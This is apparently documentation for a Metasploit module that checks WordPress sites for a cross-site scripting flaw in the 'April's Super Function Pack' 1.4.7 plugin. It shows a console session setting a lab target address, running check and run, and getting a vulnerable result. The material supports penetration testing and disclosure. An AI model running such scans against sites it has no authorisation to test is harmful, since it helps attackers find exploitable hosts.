#### Add WordPress Plugin April's Super Function Pack XSS Vulnerability.

  Application: WordPress Plugin 'April's Super Function Pack' 1.4.7
  Homepage: https://wordpress.org/plugins/aprils-super-functions-pack/
  Source Code: https://downloads.wordpress.org/plugin/aprils-super-functions-pack.1.4.7.zip
  References: https://wpvulndb.com/vulnerabilities/7068

#### Vulnerable packages*
        
  1.4.7
  
#### Usage:

##### Linux (Ubuntu 12.04.5 LTS):
```
msf > use auxiliary/scanner/http/wp_aprils_super_function_xss_scanner 
msf auxiliary(wp_aprils_super_function_xss_scanner) > show options 

Module options (auxiliary/scanner/http/wp_aprils_super_function_xss_scanner):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      80               yes       The target port
   TARGETURI  /                yes       The base path to the wordpress application
   THREADS    1                yes       The number of concurrent threads
   VHOST                       no        HTTP server virtual host

msf auxiliary(wp_aprils_super_function_xss_scanner) > info 

       Name: WordPress April's Super Function Pack XSS Scanner
     Module: auxiliary/scanner/http/wp_aprils_super_function_xss_scanner
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2014-01-06

Provided by:
  Unknown
  Roberto Soares Espreto <robertoespreto@gmail.com>

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target address range or CIDR identifier
  RPORT      80               yes       The target port
  TARGETURI  /                yes       The base path to the wordpress application
  THREADS    1                yes       The number of concurrent threads
  VHOST                       no        HTTP server virtual host

Description:
  This module attempts to exploit a Cross-Site Scripting in April's 
  Super Function Pack Plugin for Wordpress, version 1.4.7 and likely 
  prior in order if the instance is vulnerable.

References:
  http://cvedetails.com/cve/2014-100026/
  http://www.osvdb.org/101807
  https://wpvulndb.com/vulnerabilities/7068

msf auxiliary(wp_aprils_super_function_xss_scanner) > set RHOSTS 192.168.1.31
RHOSTS => 192.168.1.31
msf auxiliary(wp_aprils_super_function_xss_scanner) > check
[*] 192.168.1.31:80 - The target appears to be vulnerable.
[*] Checked 1 of 1 hosts (100% complete)
msf auxiliary(wp_aprils_super_function_xss_scanner) > run

[+] 192.168.1.31:80 - Vulnerable to Cross-Site Scripting the "April's Super Function Pack 1.4.7" plugin for Wordpress
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(wp_aprils_super_function_xss_scanner) > 
```
